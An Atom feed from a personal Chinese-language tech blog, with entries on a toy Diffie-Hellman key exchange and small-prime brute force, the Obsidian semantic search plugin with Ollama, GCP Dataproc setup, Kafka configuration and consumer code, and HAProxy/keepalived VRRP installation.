<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:base="https://hung-jia-jun.github.io">
    <title>Jason&#39;s tech blog</title>
    <link href="https://hung-jia-jun.github.io/feed.xml" rel="self" >
    <link href="https://hung-jia-jun.github.io" >
    <updated>2025-12-17T15:42:56Z</updated>
    <id>https://hung-jia-jun.github.io</id>
        <entry>
            <title>
                技術筆記
                
            </title>
            <updated>2025-12-17T15:42:44Z</updated>
            <id>https://hung-jia-jun.github.io/</id>
            <content type="html">
                &lt;p&gt;just 技術筆記&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/" >
        </entry>
        <entry>
            <title>
                密碼學 - 零知識證明 - 密鑰協商
                
            </title>
            <updated>2025-12-17T15:42:44Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/密碼學 - 零知識證明 - 密鑰協商/</id>
            <content type="html">
                &lt;img src=&quot;https://www.plantuml.com/plantuml/svg/SoWkIImgAStDuNA0inAJI_AB51npCfDJeMod_2GkBbjRXQUjQrvEwtxQt_niwWu5Mriki1e5NJkG0WKhgBH2WOv2keB6qoNBNsnU1LJuegFz-PJvppecF6rjrWGRytBsp6VJTZwViWWe_dnvuyk96u1ge6Otx44n6CAmKdZPkEFPvFQNirOyMmdLef28RltpcNjUDZGgE2hOAcYaQsabQYgeAXHmWUJWIh0OamHJ0RCAQemJr9WaY348TxzOqV5ytVIdhHkVx5hzT7qRo0niBlO6wNV2xWomd2F2xBpyabI5eipqZ18hME00RMZVzNnM2r3jipdDpsVlU3gXXyiXDIy575SG6W00&quot; alt=&quot;uml diagram&quot; /&gt;
&lt;h1 id=&quot;diffie-hellman&quot; tabindex=&quot;-1&quot;&gt;範例程式(Diffie-Hellman 方法)&lt;/h1&gt;
&lt;p&gt;讓我們用密碼學最常用的人名 Bob 與 Alice 舉例&lt;/p&gt;
&lt;p&gt;Bob 端&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import random
# Diffie-Hellman
p = 23 # 公開參數
g = 5 # 公開參數

bob_private = random.randint(1, p-1)
bob_public = (g ** bob_private) % p  # 2
print(&amp;quot;Bob 的公開值：&amp;quot;, bob_public)

alice_public = int(input(&amp;quot;請輸入 Alice 的公開值: &amp;quot;))
bob_shared = (alice_public ** bob_private) % p
print(&amp;quot;Bob 計算的共享密鑰：&amp;quot;, bob_shared)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Alice 端&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import random
p = 23 # 公開參數
g = 5 # 公開參數

alice_private = random.randint(1, p-1)
alice_public = (g ** alice_private) % p  # 8
print(&amp;quot;Alice 的公開值：&amp;quot;, alice_public)

bob_public = int(input(&amp;quot;請輸入 Bob 的公開值: &amp;quot;))
alice_shared = (bob_public ** alice_private) % p
print(&amp;quot;Alice 計算的共享密鑰：&amp;quot;, alice_shared)

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;只要輸入對方的公開數，就能計算出共享密鑰&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250717223215.png&quot; alt=&quot;Pasted image 20250717223215.png&quot; /&gt;&lt;/p&gt;
&lt;h1 id=&quot;重放攻擊&quot; tabindex=&quot;-1&quot;&gt;重放攻擊&lt;/h1&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# Eve 已知 g, p, alice_public
p = 23 # 公開參數
g = 5 # 公開參數
alice_public = 12

# Eve 嘗試所有可能的私鑰
for possible_private in range(1, p):
    if (g ** possible_private) % p == alice_public:
        print(&amp;quot;Alice 的私鑰是：&amp;quot;, possible_private)
        break
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;離散對數問題&quot; tabindex=&quot;-1&quot;&gt;離散對數問題&lt;/h2&gt;
&lt;p&gt;在正常情況下，Eve（攻擊者）無法輕易算出 Alice 的私鑰，這正是 Diffie-Hellman 密鑰交換的安全基礎。&lt;br /&gt;
原因如下：&lt;br /&gt;
Alice 的公開值是：alice_public = (g ** alice_private) % p&lt;br /&gt;
Eve 想要知道 alice_private，必須解「離散對數問題」：已知 g、p、alice_public，求 alice_private&lt;br /&gt;
這個問題在大質數下是非常困難的（目前沒有有效的演算法），所以只要 p 夠大，Alice 的私鑰就很安全&lt;br /&gt;
但如果 p 很小（像教學範例 p=23），Eve 可以用暴力法：&lt;/p&gt;
&lt;p&gt;這種方法只適用於 p 很小的情況。&lt;br /&gt;
實務上 p 至少要 2048 位元，這樣 Eve 幾乎不可能算出 Alice 的私鑰。&lt;br /&gt;
總結：&lt;br /&gt;
p 小時，Eve 可以暴力破解 Alice 的私鑰&lt;br /&gt;
p 夠大時，Eve 幾乎不可能算出 Alice 的私鑰&lt;br /&gt;
這就是 Diffie-Hellman 的安全基礎&lt;/p&gt;
&lt;h1 id=&quot;安全質數&quot; tabindex=&quot;-1&quot;&gt;安全質數&lt;/h1&gt;
&lt;p&gt;選用夠大的「安全質數」可以防止離散對數被暴力攻擊&lt;br /&gt;
&lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc3526#section-2&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://datatracker.ietf.org/doc/html/rfc3526#section-2&lt;/a&gt;&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/密碼學 - 零知識證明 - 密鑰協商/" >
        </entry>
        <entry>
            <title>
                安裝 Obsidian 語意搜尋套件
                
            </title>
            <updated>2025-12-17T15:42:44Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/安裝 Obsidian 語意搜尋套件/</id>
            <content type="html">
                &lt;p&gt;Plugin repo: &lt;a href=&quot;https://github.com/bbawj/obsidian-semantic-search?tab=readme-ov-file#demo&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://github.com/bbawj/obsidian-semantic-search?tab=readme-ov-file#demo&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在 Settings -&amp;gt; Community plugins -&amp;gt; Browse&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217181636.png&quot; alt=&quot;Pasted image 20251217181636.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;搜尋 Semantic Search&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217181747.png&quot; alt=&quot;Pasted image 20251217181747.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;安裝套件&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217181834.png&quot; alt=&quot;Pasted image 20251217181834.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;啟用 Semantic 套件&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217181933.png&quot; alt=&quot;Pasted image 20251217181933.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;安裝 ollama&lt;br /&gt;
&lt;a href=&quot;https://ollama.com/download&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://ollama.com/download&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;下載 embeding model&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;ollama pull nomic-embed-text  
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;檢查 model 是否有安裝成功&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ ollama list
NAME                       ID              SIZE      MODIFIED   
nomic-embed-text:latest    0a109f422b47    274 MB    About an hour ago    
&lt;/code&gt;&lt;/pre&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;參數名稱&lt;/th&gt;
&lt;th&gt;設定值&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;API URL&lt;/td&gt;
&lt;td&gt;&lt;code&gt;http://localhost:11434/api/embed&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Model&lt;/td&gt;
&lt;td&gt;nomic-embed-text&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;設定參數&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217182540.png&quot; alt=&quot;Pasted image 20251217182540.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;打開 command palette&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217182721.png&quot; alt=&quot;Pasted image 20251217182721.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;按照以下順序執行&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217182834.png&quot; alt=&quot;Pasted image 20251217182834.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;之後就可以用這個進行語意搜尋&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217183031.png&quot; alt=&quot;Pasted image 20251217183031.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;整體語意搜尋結果還不錯&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217183146.png&quot; alt=&quot;Pasted image 20251217183146.png&quot; /&gt;&lt;/p&gt;
&lt;h1 id=&quot;總結&quot; tabindex=&quot;-1&quot;&gt;總結&lt;/h1&gt;
&lt;p&gt;透過這個 obsidian 工具，可以做到語意級別的模糊搜尋，有時候可能就是模糊的感覺，沒有明確的關鍵字，就可以考慮用這個搜尋工具進行搜尋。&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/安裝 Obsidian 語意搜尋套件/" >
        </entry>
        <entry>
            <title>
                GCP dataproc 運行 python scripts
                
            </title>
            <updated>2025-12-17T15:42:44Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/pySpark/GCP dataproc 運行 python scripts/</id>
            <content type="html">
                &lt;p&gt;建立 dataproc cluster&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gcloud dataproc clusters create jason-test-spark-job &#92;
    --region=us-central1 &#92;
    --properties=&#39;^#^dataproc:conda.packages=google-cloud-storage==2.18.2#yarn:yarn.scheduler.maximum-allocation-mb=256928#yarn:yarn.nodemanager.resource.memory-mb=256928&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;properties&quot; tabindex=&quot;-1&quot;&gt;properties&lt;/h2&gt;
&lt;p&gt;在 package 裡面安裝 python package&lt;br /&gt;
&lt;code&gt;dataproc:conda.packages=google-cloud-storage==2.18.2&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;指定 memory 使用量&lt;br /&gt;
&lt;code&gt;yarn:yarn.scheduler.maximum-allocation-mb=256928#yarn:yarn.nodemanager.resource.memory-mb=256928&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&quot;pyspark-pip-install&quot; tabindex=&quot;-1&quot;&gt;pyspark pip install&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;建立&lt;br /&gt;
requirements.txt&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;pytest==6.2.5
pyspark==3.2.0
google-cloud-storage==1.43.0
mlflow==1.23.0
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;寫 pip init 腳本&lt;br /&gt;
pip_init.py&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;#!/bin/bash
# 1. 確認 requirements.txt 文件是否已經上傳到 GCS 並下載到本地
GCS_BUCKET_PATH=&amp;quot;gs://dataproc-staging-us-central1-473678078038-tw1bdolx/requirements.txt&amp;quot;

LOCAL_PATH=&amp;quot;/tmp/requirements.txt&amp;quot;

# 下載 requirements.txt
gsutil cp ${GCS_BUCKET_PATH} ${LOCAL_PATH}

# 使用 pip 安裝依賴
pip install -r ${LOCAL_PATH}
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&quot;3&quot;&gt;
&lt;li&gt;上傳檔案&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;gsutil cp requirements.txt gs://dataproc-staging-us-central1-473678078038-tw1bdolx/
gsutil cp pip_init.sh gs://dataproc-staging-us-central1-473678078038-tw1bdolx/
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&quot;4&quot;&gt;
&lt;li&gt;
&lt;p&gt;刪除原本的 cluster&lt;br /&gt;
&lt;code&gt;gcloud dataproc clusters delete jason-test-spark-job --region=us-central1&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;建立 cluster 時運行腳本&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;gcloud dataproc clusters create jason-test-spark-job &#92;
--region=us-central1 &#92;
--initialization-actions=gs://dataproc-staging-us-central1-473678078038-tw1bdolx/pip_init.sh
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&quot;delete-cluster&quot; tabindex=&quot;-1&quot;&gt;Delete cluster&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;gcloud dataproc clusters delete jason-test-spark-job --region=us-central1&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;submit-job&quot; tabindex=&quot;-1&quot;&gt;Submit job&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;gcloud dataproc jobs submit pyspark test.py --region=us-central1 --cluster jason-test-spark-job&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;[!IMPORTANT]&lt;br /&gt;
記得要切換 GCP 環境 (SIT/UAT/PROD)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#python&quot;&gt;#python&lt;/a&gt; &lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#pyspark&quot;&gt;#pyspark&lt;/a&gt; &lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#spark&quot;&gt;#spark&lt;/a&gt; &lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#cluster&quot;&gt;#cluster&lt;/a&gt;&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/pySpark/GCP dataproc 運行 python scripts/" >
        </entry>
        <entry>
            <title>
                kafka 高效率傳輸設定
                
            </title>
            <updated>2025-12-17T15:42:44Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/apache_kafka/kafka 高效率傳輸設定/</id>
            <content type="html">
                &lt;p&gt;訂閱 kafka 消息&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;kafka-console-consumer --bootstrap-server 127.0.0.1:19092 --topic wikimedia.recentchange
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;高效率傳輸時，可考慮以下設定&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;max.in.flight.requests.per.connection
&lt;ol&gt;
&lt;li&gt;每個 producer 在 broker 回覆 ack 前，最多送幾筆訊息出去&lt;/li&gt;
&lt;li&gt;若設定 = 1
&lt;ol&gt;
&lt;li&gt;訊息只會一筆一筆發，會降低效率，但好處是，若訊息需要嚴格的排序(有新增 sort key)，那很重要&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://linger.ms/&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;linger.ms&lt;/a&gt;
&lt;ol&gt;
&lt;li&gt;等待一段 &lt;a href=&quot;http://linger.ms/&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;linger.ms&lt;/a&gt;，在此期間收到的消息都放在自己的暫存區，若 broker 批處理(batch.size)在 &lt;a href=&quot;http://linger.ms/&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;linger.ms&lt;/a&gt; 到達之前填滿，則立即批處理暫存區內的訊息，否則達到 &lt;a href=&quot;http://linger.ms/&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;linger.ms&lt;/a&gt; 才進行批處理&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;compression.type
&lt;ol&gt;
&lt;li&gt;批處理參數，用於 broker 端壓縮訊息使用的算法(e.g. lz4、zstd、gzip...etc)&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;batch.size
&lt;ol&gt;
&lt;li&gt;批處理的單筆 message 大小，若超過，則立即處理該訊息&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/apache_kafka/kafka 高效率傳輸設定/" >
        </entry>
        <entry>
            <title>
                kafka  topic 實驗
                
            </title>
            <updated>2025-12-17T15:42:44Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/apache_kafka/kafka  topic 實驗/</id>
            <content type="html">
                &lt;p&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#kafka&quot;&gt;#kafka&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;環境設定&quot; tabindex=&quot;-1&quot;&gt;環境設定&lt;/h2&gt;
&lt;p&gt;docker-compose.yaml&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;version: &#39;2.1&#39;
services:
  zoo1:
    image: confluentinc/cp-zookeeper:7.3.2
    hostname: zoo1
    container_name: zoo1
    ports:
      - &amp;quot;2181:2181&amp;quot;
    environment:
      ZOOKEEPER_CLIENT_PORT: 2181
      ZOOKEEPER_SERVER_ID: 1
      ZOOKEEPER_SERVERS: zoo1:2888:3888

  kafka1:
    image: confluentinc/cp-kafka:7.3.2
    hostname: kafka1
    container_name: kafka1
    ports:
      - &amp;quot;9092:9092&amp;quot;
      - &amp;quot;29092:29092&amp;quot;
      - &amp;quot;9999:9999&amp;quot;
    environment:
      KAFKA_ADVERTISED_LISTENERS: INTERNAL://kafka1:19092,EXTERNAL://${DOCKER_HOST_IP:-127.0.0.1}:9092,DOCKER://host.docker.internal:29092
      KAFKA_LISTENER_SECURITY_PROTOCOL_MAP: INTERNAL:PLAINTEXT,EXTERNAL:PLAINTEXT,DOCKER:PLAINTEXT
      KAFKA_INTER_BROKER_LISTENER_NAME: INTERNAL
      KAFKA_ZOOKEEPER_CONNECT: &amp;quot;zoo1:2181&amp;quot;
      KAFKA_BROKER_ID: 1
      KAFKA_LOG4J_LOGGERS: &amp;quot;kafka.controller=INFO,kafka.producer.async.DefaultEventHandler=INFO,state.change.logger=INFO&amp;quot;
      KAFKA_OFFSETS_TOPIC_REPLICATION_FACTOR: 1
      KAFKA_TRANSACTION_STATE_LOG_REPLICATION_FACTOR: 1
      KAFKA_TRANSACTION_STATE_LOG_MIN_ISR: 1
      KAFKA_JMX_PORT: 9999
      KAFKA_JMX_HOSTNAME: ${DOCKER_HOST_IP:-127.0.0.1}
      KAFKA_AUTHORIZER_CLASS_NAME: kafka.security.authorizer.AclAuthorizer
      KAFKA_ALLOW_EVERYONE_IF_NO_ACL_FOUND: &amp;quot;true&amp;quot;
    depends_on:
      - zoo1
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;docker compose up  -d
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;docker exec -it kafka1 bash
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;刪除 JMX env&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;unset JMX_PORT &amp;amp;&amp;amp; unset KAFKA_JMX_OPTS
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;建立一個 topic&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;kafka-topics --create --topic quickstart-events --bootstrap-server localhost:9092
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;檢查 topic 詳情&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;kafka-topics --describe --topic quickstart-events --bootstrap-server localhost:9092
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;建一個 producer&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;kafka-console-producer --topic quickstart-events --bootstrap-server localhost:9092
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看目前 topic 有多少 message, 顯示的是 offset 的值&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ kafka-run-class kafka.tools.GetOffsetShell --broker-list localhost:9092 --topic quickstart-events
quickstart-events:0:16

$ kafka-run-class kafka.tools.GetOffsetShell --broker-list localhost:9092 --topic filebeat
filebeat:0:0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;建立一個 訂閱者，訂閱 quickstart-events&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;kafka-console-consumer --topic quickstart-events --from-beginning --bootstrap-server localhost:9092
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;測試 kafka consumer group  消費機制&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;kafka-console-producer --topic quickstart-events --bootstrap-server localhost:9092 --group 1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;同一個 group 只會有一個 consumer 會消費到一個 topic 的訊息&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;顯示目前 kafka 有多少 topic&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[appuser@kafka1 ~]$ kafka-topics --list --bootstrap-server localhost:9092
__consumer_offsets
filebeat
metricbeat
my_group2_v2
quickstart-events
&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/apache_kafka/kafka  topic 實驗/" >
        </entry>
        <entry>
            <title>
                Consumer offset reset 行為
                
            </title>
            <updated>2025-12-17T15:42:44Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/apache_kafka/Consumer offset reset 行為/</id>
            <content type="html">
                &lt;h1 id=&quot;情境&quot; tabindex=&quot;-1&quot;&gt;情境&lt;/h1&gt;
&lt;hr /&gt;
&lt;p&gt;consumer 預期會從 kafka 持續讀取 log，但如果 consumer crash，kafka 會保存 commited offset 7 天&lt;/p&gt;
&lt;p&gt;也說明，若 consumer 停機超過 7 天，之前消費的位置將會被重置&lt;/p&gt;
&lt;h1 id=&quot;參數&quot; tabindex=&quot;-1&quot;&gt;參數&lt;/h1&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;auto.offset.reset=latest: 會從 kafka topic 最末端讀取 log&lt;/li&gt;
&lt;li&gt;auto.offset.reset=earliest: 從最早的地方開始讀 log&lt;/li&gt;
&lt;li&gt;auto.offset.reset=none: 若沒有 offset 資訊，將會拋出 exception&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;log-consumer&quot; tabindex=&quot;-1&quot;&gt;重播 log 給 consumer&lt;/h1&gt;
&lt;hr /&gt;
&lt;p&gt;步驟如下:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;關閉該 consumer group 底下所有的 consumer&lt;/li&gt;
&lt;li&gt;使用 kafka-consumer-groups 重置你想重置的 offset 位置&lt;/li&gt;
&lt;li&gt;重啟 consumer&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&quot;java-code&quot; tabindex=&quot;-1&quot;&gt;Java code&lt;/h1&gt;
&lt;p&gt;透過 addShutdownHook 偵測 shutdown event&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;...
// get a reference  
final Thread mainThread = Thread.currentThread();  
  
Runtime.getRuntime().addShutdownHook(new Thread(){  
    public void run(){  
        log.info(&amp;quot;Detected a shutdown event&amp;quot;);  
        consumer.wakeup();  
  
        try {  
            mainThread.join();  
        } catch (InterruptedException e) {  
            e.printStackTrace();  
        }  
    }  
});
...
try(openSearchClient; consumer){  
    boolean indexExists = openSearchClient.indices().exists(new GetIndexRequest(indexName), RequestOptions.DEFAULT);  
    if (!indexExists){  
        // we need to create the index on opensearch if it doesn&#39;t exist already  
        CreateIndexRequest createIndexRequest = new CreateIndexRequest(indexName);  
        openSearchClient.indices().create(createIndexRequest, RequestOptions.DEFAULT);  
        log.info(&amp;quot;The wikimedia index has been created&amp;quot;);  
    } else {  
        log.info(&amp;quot;The wikimedia index already exists&amp;quot;);  
    }  
  
    while (true){  
        ConsumerRecords&amp;lt;String, String&amp;gt; records = consumer.poll(Duration.ofMillis(3000));  
  
        int recordCount = records.count();  
        log.info(&amp;quot;Received &amp;quot; + recordCount + &amp;quot; record(s)&amp;quot;);  
        BulkRequest bulkRequest = new BulkRequest();  
        for (ConsumerRecord&amp;lt;String, String&amp;gt; record : records){  
            try{  
                String id = extractId(record.value());  
                // send the record into opensearch  
                IndexRequest indexRequest = new IndexRequest(indexName)  
                        .source(record.value(), XContentType.JSON)  
                        .id(id);  
                //IndexResponse indexResponse = openSearchClient.index(indexRequest, RequestOptions.DEFAULT);  
                bulkRequest.add(indexRequest);  
            } catch (Exception e){  
  
            }  
        }  
        if (bulkRequest.numberOfActions() &amp;gt; 0){  
            BulkResponse bulkResponse = openSearchClient.bulk(bulkRequest, RequestOptions.DEFAULT);  
            log.info(&amp;quot;Inserted &amp;quot; + bulkResponse.getItems().length + &amp;quot; record(s).&amp;quot;);  
            try {  
                Thread.sleep(1000);  
            } catch (InterruptedException e) {  
                e.printStackTrace();  
            }  
  
        }  
  
        consumer.commitAsync();  
        log.info(&amp;quot;offset have been committed!&amp;quot;);  
    }  
} catch (WakeupException e){  
    log.info(&amp;quot;Consumer is starting to shutdown&amp;quot;);  
} catch (Exception e){  
    log.error(&amp;quot;unexpected exception: &amp;quot;, e);  
} finally {  
    consumer.close(); // close the consumer, this will also commit offest to kafka.  
    openSearchClient.close();  
    log.info(&amp;quot;The consumer is now gracefully shut down&amp;quot;);  
}
&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/apache_kafka/Consumer offset reset 行為/" >
        </entry>
        <entry>
            <title>
                HA proxy VRRP 研究
                
            </title>
            <updated>2025-12-17T15:42:44Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/Proxy/HA proxy VRRP 研究/</id>
            <content type="html">
                &lt;p&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#haproxy&quot;&gt;#haproxy&lt;/a&gt; &lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#vrrp&quot;&gt;#vrrp&lt;/a&gt; &lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#linux&quot;&gt;#linux&lt;/a&gt; &lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#keepalived&quot;&gt;#keepalived&lt;/a&gt; &lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#proxy&quot;&gt;#proxy&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;vrrp-virtual-router-redundancy-protocol&quot; tabindex=&quot;-1&quot;&gt;VRRP(Virtual Router Redundancy Protocol)&lt;/h1&gt;
&lt;p&gt;主要實現工具是 keepalived，他會透過 vrrp 廣播 master 的心跳，一但 master 死掉，Backup 就會代替 Master 回覆指定 IP 的 arp request。&lt;br /&gt;
兩台主機上都有 HA Proxy，接收到請求後會再傳到後端 server&lt;/p&gt;
&lt;h2 id=&quot;架構圖&quot; tabindex=&quot;-1&quot;&gt;架構圖&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241122113609.png&quot; alt=&quot;Pasted image 20241122113609.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;參考教學 : &lt;a href=&quot;https://medium.com/@abhilashkulkarni340/vrrp-and-4-simple-steps-to-set-it-up-on-ubuntu-454c46abb3b4&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://medium.com/@abhilashkulkarni340/vrrp-and-4-simple-steps-to-set-it-up-on-ubuntu-454c46abb3b4&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;安裝&quot; tabindex=&quot;-1&quot;&gt;安裝&lt;/h2&gt;
&lt;h3 id=&quot;haproxy&quot; tabindex=&quot;-1&quot;&gt;haproxy&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;$ sudo apt install haproxy
$ haproxy -v
HA-Proxy version 2.0.33-0ubuntu0.1 2023/10/31 - https://haproxy.org/
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;keepalived&quot; tabindex=&quot;-1&quot;&gt;keepalived&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;$ apt-get install keepalived
$ systemctl status keepalived
● keepalived.service - Keepalive Daemon (LVS and VRRP)
     Loaded: loaded (/lib/systemd/system/keepalived.service; enabled; vendor preset: enabled)
     Active: inactive (dead)
  Condition: start condition failed at Thu 2024-11-21 13:47:53 CST; 2h 11min ago

Nov 21 13:47:53 jason-2 systemd[1]: Condition check resulted in Keepalive Daemon (LVS and VRRP) being skipped.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;出現 inactive 是正常的，因為沒有 keepalived 的設定檔&lt;/p&gt;
&lt;p&gt;所以要從 keepalived config sample 裡面拿到範例設定檔&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ cp /usr/share/doc/keepalived/samples/keepalived.conf.sample /etc/keepalived/keepalived.conf
&lt;/code&gt;&lt;/pre&gt;
